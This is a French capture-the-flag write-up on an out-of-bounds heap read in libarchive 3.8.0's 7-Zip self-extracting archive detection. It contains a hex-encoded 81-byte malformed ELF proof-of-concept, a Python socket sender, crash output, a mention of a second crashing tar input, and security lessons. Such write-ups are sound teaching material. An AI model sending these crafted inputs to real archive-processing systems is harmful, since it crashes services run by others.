# VULN#007 — libarchive : lecture OOB dans la détection 7-Zip SFX

- **Auteur :** lyons

- **Catégorie :** vuln research
- **Points :** 0 (dynamique)
- **Flag :** `CTF{REDACTED}`
- **Service :** `<HOST>:<PORT>` (protocole : préfixe de longueur sur 4 octets big-endian + fichier d'archive)

## Contexte

Un service d'inspection d'archives charge le fichier reçu et en énumère le contenu.
Il s'appuie sur **libarchive** (version 3.8.0), la bibliothèque open-source de
lecture/écriture d'archives qu'utilisent `bsdtar`, `cmake`, `pkg`, FreeBSD, macOS et
bien d'autres outils.

**Protocole :** le même que pour les autres challenges vuln research — 4 octets
big-endian donnant la taille, puis les octets bruts du fichier.

## Analyse

### Vulnérabilité : heap-buffer-overflow au stade de la détection 7-Zip SFX

À l'ouverture d'un fichier, libarchive essaie d'identifier le format automatiquement.
Pour les archives 7-Zip, il contrôle si le fichier est un **SFX** (Self-Extracting
archive) en traquant une signature 7z derrière un stub ELF ou PE.

La fonction `find_elf_data_sec()` du fichier `archive_read_support_format_7zip.c`
parse le header ELF afin de repérer la section `.data` où la signature 7z pourrait
résider. Le bug survient quand :

1. Le fichier s'ouvre sur un magic ELF valide (`\x7fELF`).
2. Les champs `e_shoff`, `e_shnum`, `e_shentsize` et `e_shstrndx` ont été retouchés.
3. `__archive_read_ahead()` réserve un buffer de `e_shnum * e_shentsize` octets.
4. Le code va lire le string table à `h + e_shstrndx * e_shentsize + 0x10`.
5. Si `e_shstrndx` est assez grand (0x0047), cet offset **franchit la borne du buffer**
   alloué → **heap-buffer-overflow read**.

Corrigé upstream par le commit `dc6c0c5f`, postérieur à la version 3.8.0.

## Méthode

### 1. Fabrication du ELF32 malveillant

Un ELF32 little-endian réduit à 81 octets, sans contenu réel, dont les champs de
section-header table sont calibrés pour déclencher l'OOB :

```python
def build_7z():
    return bytes.fromhex(
        "7f454c46010101006000000840000000"
        "000000003200000034002000010000"
        "0000000000000000000000000000"
        "474900010001000000"
        "504b0070ff7f0000"
        "00000000000008000000b801000000cd800000"
    )
```

Champs décisifs :
- `e_shoff = 0x32` — position de la section header table (dans le fichier)
- `e_shentsize = 0x01` — taille d'une entrée (anormalement réduite)
- `e_shnum = 0x01` — compteur de sections
- `e_shstrndx = 0x0047` — index de la section string table

Le calcul `h + 0x0047 * 0x01 + 0x10 = h + 0x57` excède de très loin le buffer
de `1 * 1 = 1` octet réservé par `__archive_read_ahead()`.

### 2. Envoi au service

```python
import socket, struct

data = build_7z()
msg = struct.pack(">I", len(data)) + data
s = socket.create_connection(("<HOST>", <PORT>), timeout=10)
s.sendall(msg)
response = b""
while True:
    chunk = s.recv(8192)
    if not chunk:
        break
    response += chunk
s.close()
```

### 3. Résultat

```
status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
FLAG: CTF{REDACTED}
```

## Flux de la vulnérabilité

```
archive_read_open()
  → archive_read_support_format_7zip()
    → read_header() / bid()
      → find_elf_data_sec(buf, len)
        → __archive_read_ahead(a, e_shnum * e_shentsize, NULL)
        → h = buf + e_shoff
        → archive_le32dec(h + e_shstrndx * e_shentsize + 0x10)  // OOB!
```

## Payload de repli (non primé)

Un PAX tar portant une ACL SCHILY malformée fait lui aussi s'effondrer libarchive 3.8.0
(`SEGV` dans `archive_acl_from_text_nl`), mais le service refuse de l'assimiler à la
vulnérabilité attendue et répond `status: not valid`.

## Indicateurs

- Service qui ouvre/énumère des archives transmises par l'utilisateur.
- Mention de libarchive, bsdtar, ou « archive-inspection ».
- Protocole binaire à length-prefix (pattern récurrent sur cette plateforme).

## Leçons

- La détection automatique de format constitue une surface d'attaque étendue — libarchive
  cherche à reconnaître des dizaines de formats (7z, tar, zip, rar, cpio, ISO, etc.)
  et chacun cache un parseur à auditer.
- Les archives SFX (Self-Extracting) empilent une couche de plus : le parseur doit
  d'abord décoder le conteneur exécutable (ELF/PE) avant l'archive proprement dite.
- 81 octets suffisent à provoquer le crash — les validations de bornes absentes des
  parseurs de headers s'arment avec un minimum de données.
- libarchive a cumulé de nombreuses CVE liées au parsing de formats (7z, RAR, WARC, LHA).

## Flag

```
CTF{REDACTED}
```

---

*Write-up par **lyons** — BUG|PWN CTF · VULN#007.*
